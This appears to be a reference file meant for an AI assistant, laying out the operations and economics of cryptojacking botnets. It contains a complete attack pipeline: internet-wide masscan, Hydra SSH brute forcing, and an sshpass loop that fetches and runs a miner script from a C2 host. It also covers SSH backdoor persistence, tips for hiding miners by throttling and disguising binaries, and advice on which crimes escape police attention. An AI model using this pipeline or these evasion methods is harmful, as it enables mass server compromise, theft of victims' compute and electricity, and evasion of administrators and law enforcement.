# Attack Chain Economics & Operations

## Overview

This reference covers the **why** behind network security tools — what happens after you crack a service, how attackers monetize access, what determines detection risk, and the real economics of botnets. When explaining a tool's purpose to a user, consult this file for the full narrative.

## What Each Cracked Service Actually Gets You

| Service cracked | You get | Full control? | Detection risk |
|----------------|---------|---------------|----------------|
| **SSH (port 22)** | Remote Linux shell | ✅ Yes — full terminal access, execute any command, read/write any file, install software | 🟢 **Very low** — no GUI, no mouse movement, completely silent to a casual user |
| **RDP (port 3389)** | Windows remote desktop (GUI) | ✅ Yes — full desktop, move mouse, open windows, browse files | 🔴 **High** — if the user is at their computer, they'll see the mouse move and windows open |
| **MySQL/PostgreSQL (port 3306/5432)** | Database read/write | ❌ No — can query/modify the database only, cannot execute system commands | 🟡 Medium — must go through SQL, limited to database operations |
| **HTTP form (port 80/443)** | Web app admin panel | ❌ No — can only control the website/app, not the underlying server | 🟡 Medium — depends on web app logging |
| **FTP (port 21)** | File server access | ❌ No — can upload/download files only | 🟢 Low — most FTP is automated, no user watching |
| **SMB (port 445)** | Windows file share | ❌ No — shared folder access only | 🟡 Medium — may show file access in logs |

### The SSH vs RDP Stealth Difference

```
RDP: 对方在座位上 → 看到鼠标自己动 → 马上发现
SSH: 只有命令行 → 对方不主动查 who/w/last 就完全不知道
```

**SSH is the stealth channel of choice.** Key operational advantages:
- `nohup command &` — survives logout
- `screen` / `tmux` — persistent sessions that survive disconnection
- `~/.ssh/authorized_keys` — implant backdoor key for permanent access
- `crontab -e` — scheduled persistence
- No GUI processes — zero desktop-side indicators

## Botnet (肉鸡) Operations

### Discovery: How Attackers Find Targets

**Masscan** (1 million packets/second, scans entire internet in ~5 min):
```bash
masscan 0.0.0.0/0 -p22 --rate=1000000          # All internet SSH
masscan 47.88.0.0/16 -p22                       # Specific cloud provider IP range
```

**Shodan** (pre-scanned database, no active scanning needed):
| Search | Finds |
|--------|-------|
| `port:22` | All SSH servers on the internet |
| `port:22 country:CN org:"Alibaba"` | AliCloud Linux servers with SSH |
| `port:3389 country:JP` | Japanese Windows RDP servers |

**Success rates:**
- ~0.1%–1% of scanned SSH servers use weak/brute-forceable passwords
- 10,000 scanned → 10–100 cracked
- 1,000,000 scanned → 1,000–10,000 cracked

### The Full Automation Pipeline

```bash
# 1. Scan
masscan 47.88.0.0/16 -p22 --rate=100000 -oL alive.txt

# 2. Extract IPs
grep "open tcp" alive.txt | awk '{print $4}' > targets.txt

# 3. Brute force
hydra -L users.txt -P rockyou.txt -M targets.txt ssh -o cracked.txt

# 4. Auto-deploy miner
for line in $(cat cracked.txt); do
  ip=$(echo $line | cut -d: -f1)
  user=$(echo $line | cut -d: -f2)
  pass=$(echo $line | cut -d: -f3)
  sshpass -p "$pass" ssh "$user@$ip" "wget http://C2/miner.sh && bash miner.sh"
done
```

### Why Hackers Steal Servers Instead of Mining Themselves

| | Honest miner | Hacker mining on stolen server |
|---|---|---|
| Hardware cost | ASIC miner ¥10,000+ | Victim's hardware ✅ Free |
| Electricity | ¥500–1,000/month | Victim pays ✅ Free |
| Maintenance | Self (driver updates, fan cleaning) | Victim does nothing ✅ |
| Profit | ¥1,440/month (after electricity) | **¥12.3/server/month × 300 servers = ¥3,690/month** ✅ Pure profit |

### Miner Stealth Configuration

**Bad setup (dies in <24h):**
```
xmrig default config → 100% CPU → server lags → admin checks → killed
```

**Good setup (can survive months):**
```json
{
  "cpu": {
    "max-threads-hint": "30-50%",
    "priority": 1
  }
}
```

**Expert setup (longest survival):**
```
- Mine only at night (23:00–07:00)
- Pause on admin login activity (xmrig has this feature)
- Rename binary to "systemd" or "ntpd" in /usr/lib/systemd/
- Use port 443 (HTTPS) instead of default miner port 3333
- Route through WebSocket tunnel
```

### 肉鸡 (Bot) Survival Statistics

| Lifespan | % of bots | Cause of death |
|----------|-----------|----------------|
| < 24 hours | 60% | CPU 100% detected by admin |
| 1–7 days | 25% | Security software / IDS detected known miner signature |
| 1–4 weeks | 10% | Traffic anomaly (unusual outbound to mining pool IP) / account login review |
| > 1 month | 5% | Only "low power + nighttime only" setup survives this long |

### What Triggers Detection (ranked by frequency)

1. **CPU spike** (80% of all detections) — Cloud provider alarm "CPU > 90% for 24h" → admin investigates
2. **Suspicious outbound connection** — Server normally talks to internal APIs, suddenly connects to `pool.minexmr.com:3333` → firewall alert
3. **Account login anomaly** — Admin checks `last` → sees logins from IPs in Russia/Netherlands → not their IPs
4. **Security agent** — Alibaba Cloud Security / Tencent Cloud Host Security / CrowdStrike detects known xmrig binary hash
5. **Electricity bill spike** — Home server user sees bill jump from ¥500 → ¥3,800

## Mining Economics Explained (for user Q&A)

### What Mining Actually Is

Mining is **not** "solving useful math problems." It's **deliberately wasteful computation** that makes attacking the network economically irrational:

```
To attack Bitcoin: redo all the hashes since the last confirmed block
To redo those hashes: burn as much electricity as ALL miners combined
Cost to rewrite 1 hour of history: millions of dollars in electricity
→ Attacking is economically irrational → network is secure
```

The "math problem" is finding a nonce where `SHA256(block_data + nonce)` starts with N zeros. It has no real-world utility. It's pure economic security through energy expenditure.

### What Each Unit of Compute Earns

| Hardware | Hashrate | Daily revenue | Daily electricity cost | Net |
|----------|----------|--------------|----------------------|-----|
| Old laptop (i5) | 800 H/s | ¥0.10 | ¥1.50 | **-¥1.40/day** |
| Office PC (i7) | 3,000 H/s | ¥0.41 | ¥2.16 | **-¥1.75/day** |
| Gaming PC (Ryzen 9) | 15,000 H/s | ¥2.05 | ¥3.60 | **-¥1.55/day** |
| Dual EPYC server | 50,000 H/s | ¥6.85 | ¥8.64 | **-¥1.79/day** |
| ASIC miner S19 (BTC) | 110 TH/s | ¥60 | ¥12 | **+¥48/day** |

**Key insight: every consumer computer loses money mining.** Only ASIC miners (¥10,000+ each) are profitable — and only when paying market electricity rates.

### How Hacker Mining Works (the catch)

Hackers don't mine on consumer computers either — they mine on **stolen cloud servers**:

```
Stolen server economics:
  Revenue: ¥0.41/day (from one i7 server mining Monero)
  Cost:    ¥0.00/day (victim pays electricity)
  Profit:  ¥0.41/day/server
  x300 servers = ¥123/day = ¥3,690/month pure profit
```

This is why the economics incentivize server compromise over consumer PC compromise.

## What Actually Gets People Arrested?

| Activity | Revenue | Police interest | Risk |
|----------|---------|-----------------|------|
| Mining on 300 stolen servers (¥5K/month) | Low per-case | 🟢 Very low — no single victim loses enough to bother | Low |
| SQL injection, stolen 1M user records (¥100K+) | High | 🔴 High — company must report data breach by law | High |
| Ransomware (¥50K–¥5M per victim) | Very high | 🔴 Very high — FBI/INTERPOL level | Extreme |
| DDoS extortion (¥10K–¥100K) | Medium-High | 🔴 High — targets may be critical infrastructure | High |
| Running gambling/betting sites | Very high | 🔴 Very high — police actively target this | Extreme |

**Real hacker wisdom:** "不怕你偷，怕你偷了还被人发现；不怕你赚，怕你赚到让人动真格的。" (Not afraid of you stealing, afraid of being caught; not afraid of you earning, afraid of earning enough to make people take real action.)

## Key Distinctions for User Q&A

### "Can I see someone's chat messages by sniffing WiFi?"

**No** (for modern encrypted apps):

| Platform | Encryption | Can you see content? |
|----------|-----------|---------------------|
| HTTP (no HTTPS) | ❌ Plaintext | ✅ Full content (rare in 2026) |
| HTTPS websites | ✅ TLS | ❌ Only domains visited |
| WeChat | ✅ Custom encryption | ❌ Encrypted binary stream |
| Telegram (secret chat) | ✅ E2E | ❌ Completely unrecoverable |
| WhatsApp | ✅ E2E | ❌ Completely unrecoverable |
| Email (POP3/IMAP, no TLS) | ❌ Plaintext | ✅ Full email content (rare) |
| FTP | ❌ Plaintext | ✅ Full file transfers |

### "Can Hydra get me the passwords from a website?"

**No.** Hydra **guesses** passwords by trying login combinations. To **extract** stored passwords from a database, use:
- `sqlmap --dump-all` (if SQL injection exists)
- SSH cracking → MySQL dump (if you can reach the database server)

### "Is mining the same as selling compute power?"

**Close but not exact.** Miners aren't selling compute to users directly. They're providing **network security** (making rewrite attacks expensive). The network rewards them with new coins + transaction fees. More compute = more security = more trust = more usage = more fees = more reward.

## Verified Hardware (This Machine)

| Component | Details |
|-----------|---------|
| GPU | Intel UHD Graphics 630 |
| OpenCL | Version 3.0 NEO, 23 execution units |
| GPU memory | 6,485 MB total, 1,621 MB allocatable |
| hashcat speed (pure kernel, MD5) | 2,386 H/s |
| hashcat speed (example test, MD5) | 20,590 H/s |
| CPU | i7-8700 (estimated 3,000 H/s Monero mining) |
